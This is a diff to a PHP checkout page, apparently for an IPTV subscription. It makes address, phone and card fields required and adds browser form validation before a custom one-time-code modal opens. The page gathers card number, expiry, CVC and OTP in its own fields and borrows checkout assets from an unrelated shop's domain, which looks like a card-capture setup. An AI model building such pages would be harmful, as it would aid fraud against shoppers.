@@ -139,41 +139,41 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
                         </div>
                         <div class="inline-inputs">
                             <label>First name
-                                <input type="text" name="first_name" placeholder="John">
+                                <input type="text" name="first_name" placeholder="John" required>
                             </label>
                             <label>Last name
-                                <input type="text" name="last_name" placeholder="Smith">
+                                <input type="text" name="last_name" placeholder="Smith" required>
                             </label>
                         </div>
                         <label>Company (optional)
                             <input type="text" name="company" placeholder="ABDO IPTV">
                         </label>
                         <label>Address
-                            <input type="text" name="address" placeholder="123 Av. du Mont-Royal">
+                            <input type="text" name="address" placeholder="123 Av. du Mont-Royal" required>
                         </label>
                         <label>Apartment, suite, etc. (optional)
                             <input type="text" name="apartment" placeholder="Unit 302">
                         </label>
                         <label>City
-                            <input type="text" name="city" placeholder="Montréal">
+                            <input type="text" name="city" placeholder="Montréal" required>
                         </label>
                         <div class="shipping-grid">
                             <label>Country/region
-                                <select name="country">
+                                <select name="country" required>
                                     <option>Canada</option>
                                     <option>United States</option>
                                     <option>France</option>
                                 </select>
                             </label>
                             <label>State / Province
-                                <input type="text" name="state" placeholder="QC">
+                                <input type="text" name="state" placeholder="QC" required>
                             </label>
                             <label>ZIP / Postal code
-                                <input type="text" name="zip" placeholder="H2X 1Y4">
+                                <input type="text" name="zip" placeholder="H2X 1Y4" required>
                             </label>
                         </div>
                     <label>Phone
-                        <input type="text" name="phone" placeholder="+1 514 555 0000">
+                        <input type="text" name="phone" placeholder="+1 514 555 0000" required>
                     </label>
                     <div class="payment-confirmation" hidden data-payment-confirmation>
                         <div class="confirmation-icon">✔</div>
@@ -214,7 +214,7 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
                             <label class="card-input">
                                 Card number
                                 <div class="card-input__field">
-                                    <input type="text" name="card_number" placeholder="1234 1234 1234 1234" data-card-number inputmode="numeric" autocomplete="cc-number" maxlength="19" pattern="[0-9 ]*">
+                                    <input type="text" name="card_number" placeholder="1234 1234 1234 1234" data-card-number inputmode="numeric" autocomplete="cc-number" maxlength="19" pattern="[0-9 ]*" required>
                                     <span class="card-brand" data-card-brand hidden>
                                         <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/visa.sxIq5Dot.svg" alt="Card brand" loading="lazy" data-default-logo="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/visa.sxIq5Dot.svg">
                                     </span>
@@ -224,7 +224,7 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
                             <div class="card-payment__row">
                                 <label>
                                     Expiration date (MM / YY)
-                                    <input type="text" name="expiry" placeholder="MM / YY" data-card-expiry inputmode="numeric" autocomplete="cc-exp" pattern="[0-9/ ]*">
+                                    <input type="text" name="expiry" placeholder="MM / YY" data-card-expiry inputmode="numeric" autocomplete="cc-exp" required>
                                     <small class="input-error" data-error="expiry">Enter a valid expiration date</small>
                                 </label>
                                 <label>
@@ -236,16 +236,16 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
                                         data-card-cvc
                                         inputmode="numeric"
                                         autocomplete="cc-csc"
-                                        pattern="[0-9]*"
                                         maxlength="3"
                                         oninput="this.value=this.value.replace(/\\D/g,'').slice(0, this.maxLength || 3)"
+                                        required
                                     >
                                     <small class="input-error" data-error="cvc"></small>
                                 </label>
                             </div>
                             <label>
                                 Name on card
-                                <input type="text" name="card_name" placeholder="Full name" data-card-name autocomplete="cc-name">
+                                <input type="text" name="card_name" placeholder="Full name" data-card-name autocomplete="cc-name" required>
                                 <small class="input-error" data-error="card_name"></small>
                             </label>
                         </div>
@@ -345,6 +345,7 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
             const otpError = document.querySelector('[data-otp-error]');
             const otpCancel = document.querySelector('[data-otp-cancel]');
             const cvcInput = document.querySelector('[data-card-cvc]');
+            const form = submitBtn?.closest('form');
             if (!submitBtn || !otpModal) return;
 
             const digitsOnly = (value, limit) => value.replace(/\D/g, '').slice(0, limit);
@@ -412,6 +413,10 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
 
             submitBtn.addEventListener('click', () => {
                 setTimeout(() => {
+                    if (form && form.reportValidity && !form.reportValidity()) {
+                        submitBtn.setAttribute('aria-invalid', 'true');
+                        return;
+                    }
                     if (!otpModal.hidden) return;
                     if (submitBtn.getAttribute('aria-invalid') === 'true') return;
                     otpModal.hidden = false;
